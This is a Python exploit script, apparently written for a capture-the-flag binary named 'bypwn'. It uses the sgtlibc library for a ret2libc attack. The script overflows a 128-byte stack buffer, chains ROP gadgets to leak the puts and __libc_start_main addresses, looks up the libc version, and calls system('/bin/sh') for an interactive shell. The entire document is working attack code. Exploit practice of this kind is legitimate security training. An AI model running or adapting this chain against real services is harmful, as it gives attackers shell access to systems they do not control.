import sgtlibc
from sgtlibc.gamebox import *
from sgtlibc.utils import shell
from sgtlibc.ROPgadgets.gadgets_exploit import gadget_by_csu
set_config(GameBoxConfig(
    is_local=True,
    file='./bypwn',
    remote='192.168.2.107:9999',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf


def exp():
    payload_exp = [b'a' * (128), fakeebp()]  # overflow position
    payload_exp += [[elf.rop['ret']] * 1]
    return payload_exp

main_addr = 0x04006D2  # elf.symbols['main']


def leak(func: str):
    log.warning(f'start leak {func}')

    payload = [exp(), elf.rop['rdi'], elf.got[func],
               elf.plt['puts']]
    payload += [[elf.rop['ret']] * 3]
    payload += [main_addr]
    sla('EASY PWN PWN PWN~', payload)

    # ru('input:\n')
    interactive()
    # ru(fakeebp())  # 如果有输出则清空缓存
    rl()
    data = rc(6).ljust(8, b'\0')
    data = u00(data)
    log.info(f'leak {func}:{hex(data)}')
    s.add_condition(func, data)
    return data


pause()
# 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确
# leak('printf')
leak('puts')
# leak('stdout')
# leak('stdin')
leak('__libc_start_main')


# 如果给了libc则可以直接使用
# libc = ELF('libc_buu-2.23_x64.so', checksec=False)
# offset = addr - libc.symbols['__libc_start_main']
# system_addr = libc.symbols['system'] + offset
# binsh_addr = next(libc.search(b'/bin/sh')) + offset

data = s.dump(db_index=1)  # choose your system index
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
ret_addr = elf.rop['ret']  # sometime maybe wrong
payload = [exp(), [ret_addr]*1]  # 栈平衡
payload += [elf.rop['rdi'], binsh_addr, system_addr]
sl(payload)
interactive()
